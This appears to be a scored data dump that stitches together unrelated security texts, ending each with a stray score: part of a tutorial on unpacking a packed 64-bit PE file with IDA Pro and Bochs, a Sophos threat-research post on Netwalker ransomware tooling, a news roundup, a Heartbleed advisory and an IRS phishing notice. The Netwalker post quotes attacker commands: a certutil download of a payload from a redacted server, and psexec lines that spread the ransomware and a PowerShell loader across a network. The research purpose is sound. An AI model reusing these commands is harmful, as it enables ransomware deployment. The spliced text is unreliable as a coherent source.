Take a note of the instruction bytecodes forming the entry point and entry point address: 0x0402000. This address will later be our original entry point address (OEP).
Next, let’s inspect the import section and list imports using the ‘Imports’ subview from IDA Pro (Figure 4). Since we have used only two functions, MessageBoxA and ExitProcess, only those two are listed.
Figure 4. Test file imports.
The next step is to generate the target file. In order to do that we will compress our test file so that we will be able to make a comparison with the original during the unpacking process.
Figure 5. Generating a compressed file using mpress.
I’ve chosen the mpress [5] file packer since it is freely available and handles both PE and PE+ files. In order to create a new, compressed executable file, follow the commands shown in Figure 5. We use –i options since the resulting compressed file will be larger than the original one. By default, mpress refuses the compression and creation of a new executable if the resulting output file is bigger than the input. Observant readers might notice that our test file can also be used as a base for measuring the efficiency of compression algorithms. Additionally, the test file is a perfect target for reversing the compression stub since the original EXE file has such a simple construction.",0.02692409792167716
"IDA Pro native debugger vs IDA Pro Bochs plug-in
Obviously, any native 64-bit debugger supported by IDA Pro requires Windows on the x64 platform. Fortunately, the Bochs plug-in allows you to debug both PE and PE+ binaries inside Bochs, even on 32-bit platforms. The speed impact due to code emulation can be ignored in most cases during malware analysis and unpacking files. The next advantage of the Bochs plug-in, when analysing hostile code, is that the code is ‘executed’ in a virtual, controlled environment. The recently disclosed SYSRET privilege escalation vulnerability (CVE-2012-0217) demonstrates the risk associated with running hostile code inside hypervisors. The disadvantage of emulation is obvious – there are no 100% perfect emulators of bare metal hardware and the real operating system. There is a set of methods that can be used to detect if code is being executed under Bochs emulation. For some of the most basic methods see [7].
When using Bochs in PE operation mode, keep in mind that in the current version there are some important limitations:
PE+ support is limited.
Windows environment emulation is limited and this can lead to its easy detection by the process.
Thread and process manipulations are not supported – this could render the Bochs plug-in useless against more advanced compression/obfuscation methods combined with anti-debugging tricks.
Only a handful of API calls are implemented.
LoadLibrary() works only on DLLs defined in the startup.idc file before running the debugger.
Fortunately, some important Windows features such as TLS callbacks, SEH and crucial Windows structures are available. Furthermore, bochsys.dll exports the BxUndefinedApiCall() function, which catches unimplemented API calls. Setting a breakpoint on it allows such a situation to be trapped or for the end of the unpacking process to be detected. Bochsys.dll exports another useful function: BxIDACall(). Setting a breakpoint on this function allows all API calls that are handled internally by IDA Pro to be monitored.",0.022223733345457686
"Uunp plug-in
The uunp plug-in is a demonstration plug-in bundled with IDA Pro. It is available from the ‘Edit->Plugins-> Universal unpacker manual reconstruct’ menu option. As a side note: Windows 32-bit plug-ins use the *.plw file extension, while 64-bit ones use *.p64. They all reside in the plug-ins directory of the IDA Pro installation folder. Looking at the limitations of the Bochs plug-in and some additional information required by the uunp plug-in (Figure 6), you might be wondering why we are not using another plug-in distributed with IDA Pro: Universal PE Unpacker. We will discuss the Universal PE Unpacker internals in the second part of this tutorial.
The uunp plug-in does the following:
Locates the Import Address Table (IAT).
Creates an XTRN segment to represent imports.
Generates a new entry point (OEP) in the IDA database while deleting the old one used by the packer.
Forces reanalysis of new code sections.
Figure 6. uunp plug-in main window – you need to enter the correct information manually in order to get the desired results.
However, in order to get a reasonable output from the uunp plug-in we need to feed it manually with the proper addresses of the original file. The only way we can find out the requested information is to execute or emulate decompression code. The most important pieces of information we need to gather are: the original entry point (OEP) address and the Import Address Table (IAT) start and end address. The value for the ‘Code end address’ field could theoretically be guessed, however this is not recommended when analysing malware.",0.012331076563056653
"Unpacking PE+ with IDA, Bochs and uunp
Let’s start with the default PE+ file loader from IDA Pro – in order to do that, just open the compressed test file. The default PE+ file loader (Figure 7) will warn us about the Import Table section (Figure 8).
Figure 7. Loading the compressed file – note that the ‘Make imports segment’ option is enabled by default.
Figure 8. IDA Pro-generated warning during the loading of a PE+ file with a strange Import Table.
Next we should examine our PE+ file layout in memory using the option ‘View->Open subviews->Segments’ (shift+F7 is the default shortcut). Figure 9 shows that there are three segments, named .MPRESS1, .MPRESS2, .MPRESS2 and .idata (this is not a mistake: the .MPRESS2 name is used twice, but the two segments have different start addresses). Note that segments in IDA Pro are not directly equal to executable file sections. In our case, segments have been created automatically by IDA Pro. A different list of segments will be created if we load our PE+ file with the ‘Make imports segment’ option disabled.
Figure 9. IDA Pro automatically generates segments of the compressed file with the ‘make imports segment’ options enabled.
Since the name ‘.idata’ suggests that IDA Pro has somehow created an Import Address Table section (marked as XTRN), we can inspect it, but first let’s check which imports IDA detected. Use the ‘View->Open subviews->Imports’ option to list all imports (Figure 10). Only three Windows functions are imported: GetModuleHandleA, GetProcAddress and MessageBoxA. Inspection of the ‘.idata’ segment confirms our findings (Figure 11). At least one obvious function import is missing from this picture: LoadLibrary and VirtualProtect come to mind.
Figure 10. Compressed file imported functions – LoadLibrary is missing, for example.
Figure 11. Inspection of the .idata segment.
Since it was detected in the imports, we can assume that GetProcAddress is being used by the decompression loop. Therefore, we can either manually analyse and trace code under the debugger in order to find its invocation or we can set up a breakpoint at GetProcAddress. Since this is a tutorial, setting up a breakpoint at GetProcAddress is not a bad idea. It will not only allow us to verify our hypothesis that functions found in the import table are used to recreate the original IAT, but also to inspect how IDA Pro cooperates with Bochs at a low level. This knowledge may be helpful in the future in case of more advanced assignments.
Before running the Bochs debugger plug-in we need to configure it. From the ‘Debugger’ menu choose ‘Select debugger option’. From this window select ‘Local Bochs debugger’ (see Figure 12).
Figure 12. Selecting Bochs local debugger as default for this session.
Next, again from the ‘Debugger’ menu, select ‘Debugger options…’ – a new configuration window will open (Figure 13). From this window click the ‘Set specific options’ button to display another window, as shown in Figure 14. Be sure to enable 64-bit support and PE file support in this window.
Figure 13. Configuring basic debugger options.
Figure 14. Bochs specific options.
Now we are ready to start unpacking our target file. First go to the PE+ entry point – this can be done by pressing Ctrl+E and selecting one of the possible addresses (Figure 15). In our case, IDA Pro detected only one entry point and labelled it ‘start’. This is obviously not our Original Entry Point. Let’s add a breakpoint at the entry point. Press F2 at the entry point (0x04040C2 address in our case) and start a debugger. This can be done either by pressing the green ‘play’ icon on the toolbar or by pressing the F9 key. Take a second to look at the navigation bar – the current entry point is located near the end of the file: many compression/obfuscation tools just add their code after the original file end. This could be a hint that the OEP may be located below the current entry point, however at this point this is only a hypothesis.
Figure 15. Selecting the entry point.
Figure 16. Breakpoint hit at the entry point.
After pressing the F9 key (Run), the debugger should stop at the first instruction. Now we can finally add a breakpoint at the GetProcAddress function. In order to do so, open the ‘Breakpoints’ list from the ‘Debugger->Breakpoints->Breakpoint list’ menu. Now press the ‘insert’ key to add a new breakpoint. At the ‘location’ field enter ‘kernel32_GetProcAddress’ (remember that the kernel32 name is misleading since we are dealing with the 64-bit version despite the ‘32’ in the name) and click ‘OK’. Now, run the debugger again (F9) and wait until the GetProcAddress function breakpoint has been hit. Our function should look like this:
KERNEL32.dll:0000000078D26455 kernel32_GetProcAddress:
KERNEL32.dll:0000000078D26455 push cs:off_78D2645C
KERNEL32.dll:0000000078D2645B retn",0.027682429690726984
"Use ‘step into’ (F7) options to execute the retn instruction. The next function should be within the bochsys module:
bochsys:FFFFC00000001467 bochsys64_BxGetProcAddress: ; DATA XREF: KERNEL32.dll:off_78D2645Co
bochsys:FFFFC00000001467 mov rax, 0FFFFC00000001467h
bochsys:FFFFC00000001471 call      near ptr bochsys64_BxIDACall
bochsys:FFFFC00000001476 retn",0.0167779003180627
"We can ‘step over’ this code until we reach the retn instruction. This is a stub code used by the Bochs plug-in to communicate with IDA, as mentioned earlier. After executing the retn instruction we return to our module inside the .MPRESS1 section:
.MPRESS1:00000000004010D4 test     eax, eax
.MPRESS1:00000000004010D6 jz short loc_401103
.MPRESS1:00000000004010D8 push     rax
.MPRESS1:00000000004010D9 push     rsp
.MPRESS1:00000000004010DA pop      r9
This is obviously the code that checks the success of GetProcAddress (test eax,eax). Now let’s open the Imports window and jump to GetProcAddress import (Figure 17):
Figure 17. GetProcAddress import.
Now you see there is a cross reference j_GetProcAddress – jump to it (Figure 18).
Figure 18. GetProcAddress jump.
There is another cross reference at .MPRESS1:0x0401152. Once again, jump to that cross reference to find the following code:
MPRESS1:000000000040114F loc_40114F:                       ; CODE XREF: .MPRESS1:0000000000401141j
.MPRESS1:000000000040114F mov      rcx, rbx                ; hModule
.MPRESS1:0000000000401152 call     j_GetProcAddress
.MPRESS1:0000000000401157 stosq
.MPRESS1:0000000000401159
.MPRESS1:0000000000401159 loc_401159:                      ; CODE XREF: .MPRESS1:0000000000401161j
.MPRESS1:0000000000401159 xor      al, al
.MPRESS1:000000000040115B mov      [rsi-1], al
.MPRESS1:000000000040115E lodsb
.MPRESS1:000000000040115F or al, al
.MPRESS1:0000000000401161 jnz      short loc_401159
.MPRESS1:0000000000401163 jmp      short loc_401132
The stosq instruction should store the address returned by the GetProcAddress() function at the location pointed to by the RDI register. The RDI register value during the first iteration of this loop will point to the original IAT. Consequently, at this address the RDI register during the last iteration will point to the end of the IAT. Note both values, since these are required by the uunp plug-in.
Stepping over this loop we can see how the IAT is being reconstructed and finally, when we reach the following code, we have found the jump to the original entry point:
MPRESS1:0000000000401165 exit_to_oep:                      ; CODE XREF: .MPRESS1:0000000000401118j
.MPRESS1:0000000000401165 lea      rdi, loc_40106F
.MPRESS1:000000000040116C mov      al, 0E9h
.MPRESS1:000000000040116E stosb
.MPRESS1:000000000040116F mov      eax, 10Ch
.MPRESS1:0000000000401174 stosd
.MPRESS1:0000000000401175 add      rsp, 28h
.MPRESS1:0000000000401179 pop      r8
.MPRESS1:000000000040117B pop      rdx
.MPRESS1:000000000040117C pop      rcx
.MPRESS1:000000000040117D pop      rbx
.MPRESS1:000000000040117E pop      rsi
.MPRESS1:000000000040117F pop      rdi
.MPRESS1:0000000000401180 jmp      OEP_at_0x402000",0.020160138551115536
"A few important observations should be made at this point:
The packer does not use the popa instruction before jumping to the original entry point (some 32-bit compressors use it). Therefore, any universal unpacking methods based on detecting the popa instruction before jumping to OEP will fail. Popa/popad is not valid in long mode, as mentioned earlier (however POPFQ is).
We can use the long list of pop instructions ending with the jmp as a signature to look for the original entry point address. Note that our OEP is actually at a higher address than the decompression exit code. This means that any plug-in trying to automatically detect the OEP based on a jump below the decompression loop in memory will also fail.
At this point we can feed the uunp plug-in with the data we have gathered during our debugging session.",0.01681420805842382
"IDA Pro alternative strategies
Manual unpacking obviously does not scale well in production environments. Therefore, plug-ins like uunp can be treated only as a simple demonstration of IDA Pro’s scripting abilities and plug-ins/modules architecture. If you are willing to automate the unpacking process with IDA Pro, or the case you are working on requires some special treatment/tricks, you have a couple of options that might help you:
Write a custom loader module – all examples here were based on IDA Pro default PE+ loader. However, you can either load a file manually, bypassing the loader (this option is quite handy when some uncommon PE+ format tricks are used), or implement your own loader. This could be handy if you are able to automatically decompress original code and data plus reconstruct the import table. Obviously this requires either some knowledge about how a certain packer works, or use of a more generic approach based on execution/emulation of code.
Write a custom processor module – this option is especially handy when, besides the compression/encryption algorithm, some kind of virtual machine/bytecode scheme has been used in order to further obfuscate the original executable code.",0.015138616362356805
"Final notes and challenges
It turns out that unpacking 64-bit PE files doesn’t really differ much from unpacking 32-bit EXEs or DLLs. The only difference is the limited number of tools that can handle the PE+ format correctly.
Furthermore, both 32- and 64-bit architectures allow complex compression, encryption and obfuscation techniques, and since PE(+) structures add some complexity to the equation, we are yet to see new techniques. Of course, the complexity of PE+ will increase as natural Windows platform evolution introduces new bugs and vulnerabilities into the process loader. I’m afraid that those vulnerabilities are likely to be exploited sooner rather than later.
In the second part of this tutorial (which will appear in the August issue of VB) I will dig a bit more deeply into Windows x64 internals, use some of IDA Pro’s scripting functionality and use WinDbg to unpack our example file. In the meantime, if you would like to see another example of unpacking an mpress binary with IDA Pro take a look at the blog post at [9].",0.013424099411447399
"Bibliography
[1] HX DOS Extender. http://www.japheth.de/HX.html.
[2] MSDN: Overview of x64 Calling Conventions. http://msdn.microsoft.com/en-us/library/ms235286(v=vs.80).aspx.
[3] MSDN: Prolog and Epilog. http://msdn.microsoft.com/en-us/library/tawsa7cb(v=vs.80).aspx.
[4] flat assembler. http://flatassembler.net/.
[5] mpress. http://www.matcode.com/mpress.htm.
[6] UPX. http://upx.sourceforge.net/.
[7] Ferrie, P. Attacks on Virtual Machine Emulators. https://www.symantec.com/avcenter/reference/Virtual_Machine_Threats.pdf.
[8] WinDbg. http://msdn.microsoft.com/en-us/windows/hardware/gg463009.aspx.
[9] Unpacking mpress’ed PE+ DLLs with the Bochs plugin. http://www.hexblog.com/?p=403.
",0.01447218386709892
Netwalker ransomware tools give insight into threat actor,0.009627806116685567
A survey of attacker files reveals orchestration techniques & preferred exploits,0.007044342934672598
"Written by
Gabor Szappanos,",0.010162893769870451
Andrew Brandt,0.008937450115869772
"May 27, 2020",0.008719495808383715
SophosLabs Uncut Threat Research Br4pbr4p CVE-2015-1701 CVE-2017-0213 CVE-2019-1458 CVE-2020-0796 dirtycow Exploit firefart Netwalker pokemon Smaug source code Zeppelin,0.009122893811825739
"While investigating a malware campaign involving Netwalker ransomware, SophosLabs stumbled upon a set of files used by the criminals involved in the attacks. The trove of malware and related files reveals details about methods the attackers employed to compromise networks, elevate their privileges, and distribute the malware to workstations in very recent attacks.
In this blog, we’ll survey the collection and the insight it provides into this threat actor’s typical behavior. The tools included legitimate, publicly-available software (like TeamViewer), files cribbed from public code repositories (such as Github), and scripts (PowerShell) that appeared to have been created by the attackers themselves.
The Netwalker threat actor has struck a diverse set of targets based in the US, Australia, and western Europe, and recent reports indicate the attackers have decided to concentrate their efforts targeting large organizations, rather than individuals. The tooling we uncovered supports this hypothesis, as it includes programs intended to capture Domain Administrator credentials from an enterprise network, combined with orchestration tools that employ software distribution served from a Domain Controller, common in enterprise networks but rare among home users.
And while the bulk of the payloads were Netwalker, we also found individual samples of the Zeppelin Windows ransomware and the Smaug Linux ransomware as well.",0.011434214420570576
"What’s in a criminal’s toolbox
The archive contained at least 12 archived copies of the ransomware deployment package used by the threat actors, but also included a bonanza: a comprehensive set of tools used to perform reconnaissance on targeted networks; privilege-elevation and other exploits against Windows computers; and utilities that can steal, sniff, or brute-force their way to valuable information (including Mimikatz, and variants called Mimidogz and Mimikittenz, designed around avoiding detection by endpoint security) from a machine or network.
Some of the scripts and exploit tools were copied directly from Github repositories. Several of the tools are freely-available Windows utilities, such as Amplia Security’s Windows Credential Editor.
We also found a nearly complete set of the Microsoft SysInternals PsTools package, a copy of NLBrute (which attempts to brute-force passwords), installers for the commercial TeamViewer and AnyDesk remote support tools, and a number of utilities created by endpoint security vendors that are designed to remove their (and other companies’) endpoint security and antivirus tools from a computer.
Dissecting the break-in
It isn’t entirely clear how the threat actors behind this campaign gain an initial foothold into the networks they target, though there are hints they take advantage of well-known, heavily publicized vulnerabilities in widely used, outdated server software (such as Tomcat or Weblogic) or weak RDP passwords.",0.012816829327533807
"We found a brute-force tool called NLBrute, with configuration files that tell us it had been set up to use an included set of username and passwords to try to break in to machines that have Remote Desktop enabled. NLBrute can be used in attacks targeting the perimeter, as well as a way to gain lateral access to other machines from a “foothold” in the network.
Once inside the network of their target, the attackers apparently use the SoftPerfect Network Scanner to identify and create target lists of computers with open SMB ports, and subsequently may have used Mimikatz, Mimidogz, or Mimikittenz  to obtain credentials.
The files we recovered also revealed their preferred collection of exploits. Among them, we found variations on the EternalDarkness SMBv3 exploit (CVE-2020-0796), a CVE-2019-1458 local privilege exploit against Windows, the CVE-2017-0213 Windows COM privilege escalation exploit published on the Google Security Github account, and the CVE-2015-1701 “RussianDoll” privilege escalation exploit.
You can either “su firefart” or…
We also found the source code for the firefart variant of the pokemon exploit against the dirtycow vulnerability; that’s far too many ludicrous names for one Linux privilege escalation exploit. The attackers did not even bother modifying it from its default configured username value of firefart, either, but they may do that elsewhere.
In addition to exploits and hacking tools, the attackers have pulled together a ragtag collection of software designed to remove endpoint security and antivirus tools from Windows computers. Among the tools we found in their collection were AV Remover, published by ESET, and Trend Micro WorryFree Uninstall.
Ransomware delivery
The attackers typically distribute Netwalker ransomware with the use of a reflective PowerShell loader script that has been protected from casual analysis with several layers of obfuscation.
The script itself decodes and executes a large blob of base64-encoded text and converts it into a huge byte array. The script then decrypts that byte array (with a one-byte XOR algorithm) into a string, and then decodes another byte array out of this second array that normally (but not always) contains both a 32-bit and 64-bit version of the DLL, which it then loads into memory.
The byte arrays contain a 32-bit and 64-bit compiled payload
Here the array $dYtajKpwMqeYDr contains the 32-bit payload and $pLJPFgJtEVxJpXr the 64-bit payload. The starting MZ marker is replaced with 0xad 0xde in order to avoid suspicion (highlighted in green). It is not needed anyway, because the DLLs are not loaded by the operating system; the script implements all the necessary steps, without checking the MZ magic.
Finally the script deletes the shadow copies, in a preparation for the ransomware operations.
The attackers orchestrate attacks using batch or PowerShell scripts that are executed, with the help of domain controllers, on any machine the DC can reach. The scripts retrieve the attackers’ payloads using psexec or certutil.
They apparently create a Domain Admin account named SQLSVC and give it the password Br4pbr4p (which also happens to be the password salt preconfigured in the dirtycow exploit script) and then leverage that account to perform a series of commands.
certutil is a WIndows component that can download external content to the computer. In a typical attack, the criminals follow this paradigm:
certutil.exe -urlcache -split -f http://{redacted}:8000/l0.exe l0.exe
The attackers sometimes issue this downloader command en masse to the targeted computers, which dutifully download the executable form of the Netwalker ransomware as a payload.
Alternatively, they distribute the ransomware executable within the targeted network themselves, in real time. The files we recovered indicate they do it by executing a script file, which uses the Sysinternals psexec tool to move laterally by trying to copy it to every machine they can reach:
""commandLine"" : ""psexec.exe  \\\\{redacted}.1 -d -c -f c:\\programdata\\rundl1.exe"",",0.014792722214087561
"""commandLine"" : ""psexec.exe  \\\\{redacted}.2 -d -c -f c:\\programdata\\rundl1.exe"",",0.009912766940506357
…,0.008910712288718647
"""commandLine"" : ""psexec.exe  \\\\localhost -d -c -f c:\\programdata\\rundl1.exe"",
The relevant psexec command line switches are:
-c         Copy the specified program to the remote system for
execution. If you omit this option the application
must be in the system path on the remote system.",0.009561945591441079
-d         Don't wait for process to terminate (non-interactive).,0.01368703414183936
"-f         Copy the specified program even if the file already
exists on the remote system.
So this method uses psexec itself to copy the payload over the network, overwrite earlier versions (if found), and run it without waiting for any response.
The attackers sometimes get a foothold within an organization, explore the network for a while, then distribute a PowerShell dropper for the ransomware.
They use batch files that leverage psexec, again, to push PowerShell loader scripts out to machines the network scanner finds on the internal network.
for /f %%G IN (%INPUT_FILE%) DO PsExec.exe -d \\%%G powershell -ExecutionPolicy Bypass -NoProfile -NoLogo -NoExit -File \\{redacted}\Users\{redacted}\{redacted}.ps1
In both cases, the process ends with the Netwalker payload loaded and executed. The final malware is either a DLL or executable file.
The files on the target computer get encrypted and the user finds a ransom message like this one:
The Netwalker ransom demand. Click to view the entire note
Each time they attacked a new victim organization, the attackers use a unique build of the Netwalker DLL. Oddly, many of the Netwalker DLLs have the same creation time in their PE header. In fact, the only difference between them is the encrypted blob store in resource number 1337 or 31337. It seems likely that, most of the time, they use the same DLL template and only change this encrypted blob.
Resource 1337 in Netwalker
Conclusion
Ransomware attack nowadays are not single-shot events like Wannacry was in 2017. The criminals have well-established procedures and toolsets they routinely use. The attacks are usually longer: attackers spend days (or even weeks) within the victim organizations, carefully mapping the internal network while gathering credentials and other useful information.
Our findings are a good example of the trend that we have observed all around the threat landscape. The criminals orchestrate well-designed manual attack, infiltrate and thoroughly recon the victim systems, disable protection before delivering the final attack.
The threat actors behind the Netwalker ransomware rely less on self-made tools than do other ransomware groups. The largest part of the toolset are tools collected from the public domain. The use of these so-called grey hat applications saves them development time at the cost of originality.
Views like this one, directly into the attacker’s tactics and tooling, offer a rare glimpse behind the curtain that dramatically helps defenders prepare their defense against the early stages of an attack, before attackers can deliver their ransomware payloads.
IOCs
SophosLabs has published a list of indicators of compromise for samples acquired for this analysis on its Github page.",0.018232324687030288
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"A Week in Security (Feb 14 – Feb 20)
Last week, we proudly revealed a number of brand new stuff from Malwarebytes: an enterprise solution, logo, and website. Heck, this blog was even renamed to Malwarebytes Labs. Do check out that post by our CEO Marcin Kleczynski for more details.
We also talked about doxing—what it is and why it is illegal—and how one can protect themselves from it; revealed a new trick up the sleeves of tech support scammers; and disclosed a phishing campaign aimed at accounting firms.
Senior security researcher Jérôme Segura provided fresh information regarding a then ongoing malvertising campaign against WordPress sites initially reported by our friends at Sucuri. Segura homed in on the updated URL pattern and the shift in payload exploit from the Nuclear EK to the Angler EK.
Speaking of malvertising, Segura was able to trace another campaign from an unlikely source: the “social search” browser add-on called Wajam. He observed that it injects ad banners into existing pages on top of displaying regular adverts. Affected systems were finger printed then served with the Angler EK.
For our PUP Friday post topic, we looked at a specific program claiming to be a YouTube video downloader but actually led users to a tech support scam.
Notable news stories and security related happenings:",0.013407327486300025
"VTech ‘is Responsible’ for Kids’ Data, Says UK Watchdog. “The terms include the caveat that VTech only absolves itself of responsibility in so far as ‘applicable laws’ allow it to do so. The Information Commissioner’s Office has confirmed that this would not be possible in the UK. ‘The law is clear that it is organisations handling people’s personal data that are responsible for keeping that data secure, said a spokeswoman. A data protection specialist added that this would be the case for other EU countries too.” (Source: The BBC)
Communication Essential for Healthcare to Survive Cyberattacks Reputation Intact, Expert Says. “A breach-filled 2015 showed healthcare is at major risk for cyberattacks, a situation experts say makes it more important for health organizations to have plans in place to deal with the aftermath of a security crisis.” (Source: Healthcare IT News)
Intercede Launches Two-Factor Biometric Authentication Solution for Mobile Devices. “Once the initial enrollment is completed, users can access the application via a PIN code or fingerprint scan. The solution ensures that no other user can access the application account without having access to both the correct device and the relevant PIN or fingerprint.” (Source: Biometric Update Dot Com)
Why Companies are Becoming More Likely to Pay When Struck by Ransomware. “Twenty-four percent of companies say they would pay. And not only would they cough-up the money, but 14% of the polled would pay $1 million or more to prevent the attack, according to findings by the Cloud Security Alliance (CSA) and Skyhigh, who have compiled the study. The CSA is a non-profit promoting best-practices in cloud use; Skyhigh is a cloud security company.” (Source: Network World)
New Malware Targets Android Users Through Text Messages. “This new malware is being called Mazar Android BOT and it is spread via SMS and MMS messages. A user will receive a text message which includes a malicious link to an Android application package (APK).” (Source: IT Pro Portal)
Sony Hackers Still Active, ‘Darkhotel’ Checks Out Of Hotel Hacking. “There has been a noticeable shift in how some advanced threat groups such as this respond after being publicly outed by security researchers. Historically, cyber espionage gangs would go dark. […] But Baumgartner says he’s seen a dramatic shift in the past few years in how these groups react to publicity. Take Darkhotel, the Korean-speaking attack group known for hacking into WiFi networks at luxury hotels in order to target corporate and government executives. Darkhotel is no longer waging hotel-targeted attacks — but they aren’t hiding out, either.” (Source: Dark Reading)
Scam Of The Week – Netflix For Free. “Some of the campaigns are dropping actual malware on the box, others phish for the user’s login and/or payment information and sell these on the dark web. All of the campaigns start with some form of social engineering.” (Source: KnowBe4)
Now It’s Nigeria’s Authorities Who Want to Regulate Apps Like WhatsApp and Facebook. “WhatsApp, Facebook, Twitter and Skype, all immensely popular in Africa’s most populous nation, are all considered OTT services which telecoms carriers claim are posing a danger to their core business. The Nigerian Communications Commission (NCC) describes OTTs as ‘services carried over the networks, delivering value to customers, but without any carrier service provider being involved in planning, selling, provisioning, or servicing them’. The NCC says this means traditional telecoms firms cannot directly earn revenue from OTTs.” (Source: Quartz)
The Great EMV Fake-Out: No Chip For You! “Many banks are now issuing customers more secure chip-based credit cards, and most retailers now have card terminals in their checkout lanes that can handle the “dip” of chip-card transactions (as opposed to the usual swipe of the card’s magnetic stripe). But comparatively few retailers actually allow chip transactions: Most are still asking customers to swipe the stripe instead of dip the chip.” (Source: Krebs on Security)
10 Years of Mac Malware: How OS X Threats Have Evolved. “As Mac usage continues to steadily grow in popularity, so does the prevalence of Mac malware and security flaws—the threat landscape continues to change over time. The Mac experts at Intego put together a visual timeline that highlights the nastiest, most prevalent threats to demonstrate just how Mac malware has evolved since discovering the Oompa-Loompa Trojan horse.” (Source: Intego’s The Mac Security Blog)
Turning Back Time on Your iPhone can ‘Brick’ the Device – Don’t Fall for the 1970 Scam. “As per reports, a horrid hoax message is doing the rounds over the entire social media and prominent online forums, which says that if you want to ‘activate an Easter egg’ just turn back time by setting the date to January 1st, 1970 and then reboot the phone which will activate Easter egg for you. That’s not all, the message also claims that by setting back the date the user will ‘warp back in time with a classic Macintosh theme to relive the magic.'” (Source: Hack Read)
VoIP Phones Can be Turned into Spying or Money-making Tools. “A security vulnerability present in many enterprise-grade VoIP phones can easily be exploited by hackers to spy on employees and management, says security consultant Paul Moore. In a less dangerous attack alternative, these compromised devices can also be made to covertly place calls to premium rate numbers operated by the attackers or their associates.” (Source: Help Net Security)
Instagram Bug Could Have Allowed Others to Read Your Direct Messages. “Its Android developers proudly rolled out a brand-new feature that made it easy to set up a shared account to complement your private account. You’d be able to switch between up to five accounts without logging out and re-logging into another one. Cool, right? But, according to the Android experts at Android Central, many users who tried this got an unpleasant surprise: if you shared one account with other users, they started seeing notifications about private direct messages to the account you didn’t share.” (Source: Sophos’s Naked Security Blog)
Healthcare Data Breaches Lead More Patients to Withhold Information from Doctors. “Some reasons predate computers and are as old as society itself, including shame, embarrassment, and fear of censure. However, fears about unauthorized access to, and abuse of, electronically stored personal health information were voiced as soon as database technologies began to emerge in the latter half of the last century. In fact, the US government agency that was then known as the Department of Health, Education, and Welfare (HEW) prompted some of the first serious thinking about the impact of computer databases on society. A 1973 document commissioned by that agency and subsequently known as the HEW Report, examined the many fears raised by the growing computerization of personal information.” (Source: ESET’s We Live Security Blog)
Fighting Malware Monetization and Application Vulnerabilities. “This year’s Cyber Risk Report examines the 2015 threat landscape in this context, and highlights important industry issues such as new security research regulations, the “collateral damage” from high profile data breaches, shifting political agendas, and the ongoing debate over privacy and security.” (Source: Help Net Security)
This is Why People Fear the “Internet of Things”. “Imagine buying an internet-enabled surveillance camera, network attached storage device, or home automation gizmo, only to find that it secretly and constantly phones home to a vast peer-to-peer (P2P) network run by the Chinese manufacturer of the hardware. Now imagine that the geek gear you bought doesn’t actually let you block this P2P communication without some serious networking expertise or hardware surgery that few users would attempt.” (Source: Krebs on Security)
Twitter Password Recovery Bug Exposes 10,000 Users’ Personal Information. “Users should not count on websites to shield their affiliations with those services, because leaks of registration information are common. From a security perspective, users valuing their privacy should take advantage of tools available to protect their accounts from possible hijacking, for example by enabling two-factor authentication when offered.” (Source: CSO)
Attackers Favor Old Exploits, Mobile Apps. “While few doubt the cleverness of hackers, the disheartening truth is they don’t need to be all that clever to gain access to sensitive data. […] Similarly, the top 10 vulnerabilities (called CVEs or common vulnerabilities and exposures by security researchers) leveraged by attackers in 2015 are more than a year old and nearly half of them are at least five years old.” (Source: eSecurity Planet)
The End of the Line for Flash? Not So Fast. “In late 2015 Adobe announced it was renaming Flash to Adobe Animate which reinvigorated cries that “Flash must die!” from Fortune, Wired, PCWorld, CIO.com, and bloggers in general. Flash, per Adobe, allows reach to over 1 billion connected desktops. While there is a movement to replace Flash with some of the elements in HTML5, it is likely going to be a long road.” (Source: Digital Guardian)",0.017675244735027795
"Safe surfing, everyone!
The Malwarebytes Labs Team
",0.01166910416539002
"""Heartbleed"" Vulnerability in OpenSSL (CVE-2014-0160) Could Lead To Data Theft",0.01617202496519976
Websense® Security Labs™ has been tracking news of a vulnerability in the implementation of OpenSSL which has far-reaching implications for it's users and those impacted by it's use.,0.010380971362685898
"The vulnerability, CVE-2014-0160, allows a remote attacker to read the memory of systems protected by vulnerable versions of OpenSSL.  Data that may be stolen includes certificates, private keys, Personally Identifiable Information (PII) and any other sensitive data.",0.013923668555871238
"For those not familiar with OpenSSL it is an Open Source toolkit implementing the Secure Sockets Layer (SSL v2/v3) and Transport Layer Security (TLS v1) protocols as well as a full-strength general purpose cryptography library.  It is deployed in many scenarios such as within email servers and VPN systems, and can be embedded within operating systems.  Any such system using the vulnerable version of OpenSSL is thus vulnerable to exploitation.",0.0090547111911351
The vulnerability exists in OpenSSL v1.0.1 through v1.0.1f (also v1.0.2-beta1).  Please refer to http://www.openssl.org/news/vulnerabilities.html for detailed information.,0.010521639283284645
Please note: an updated (fixed) version of OpenSSL is now available in v1.0.1g,0.010431249185872571
"Confirmation of this can be found on https://www.openssl.org/news/secadv_20140407.txt (in anticipation of the openssl website being under heavy load, we have provided a screenshot of their advice below):",0.009817775784733196
"We strongly recommend that you establish whether vulnerable instances of OpenSSL are used in your environment, and if so, you should upgrade OpenSSL, or the software that uses OpenSSL, immediately.",0.013991851453403426
"Codenomicon, recognised as one of the discovering parties, have provided detail on this vulnerability as well as other mitigation actions that you should consider, which include:",0.010178918397463876
Recompile your existing OpenSSL version with -DOPENSSL_NO_HEARTBEATS option (to disable the vulnerable component).,0.014277377366835209
Revoke and reissue all certificates from the past 2 years (since the bug has been in existence).,0.01819452352640971
Generate new private keys.,0.018640069069875365
Invalidate all session keys and cookies.,0.01318482048261349
"Any end users who suspect that they may have interacted with a web server that is, or was, vulnerable to this flaw should consider resetting their passwords.",0.010006425594881518
"It is understood that web server logs will not show whether the vulnerability has been used, thus making an attack difficult to detect from that perspective.",0.011259063403639025
"Our ThreatSeeker® Intelligence Cloud has identified that numerous Proof Of Concept tools have been launched online that can be used to show whether a particular website is vulnerable to CVE-2014-0160.  We have seen reports to suggest that upwards of 600 of the Top 10,000 websites (as ranked by Alexa) are still vulnerable.",0.013212925178287316
"Websense Security Labs will continue to monitor the impact of this vulnerability.
",0.010839341504235822
"Cybercriminals are currently spamvertising with IRS (Internal Revenue Service) themed emails, enticing end and corporate users into downloading and viewing a malicious .htm attachment.",0.016873420760652236
More details:,0.008320251094065867
"Spamvertised subject: Your tax return appeal is declined
Spamvertised message: Dear Chief Account Officer, Hereby you are notified that your Income Tax Refund Appeal id#9056219 has been REJECTED. If you believe the IRS did not properly estimate your case due to a misunderstanding of the facts, be prepared to provide additional information. You can obtain the rejection details and re-submit yo ur appeal by using the instructions in the attachment.
Malicious attachment: IRS_H11832502.htm
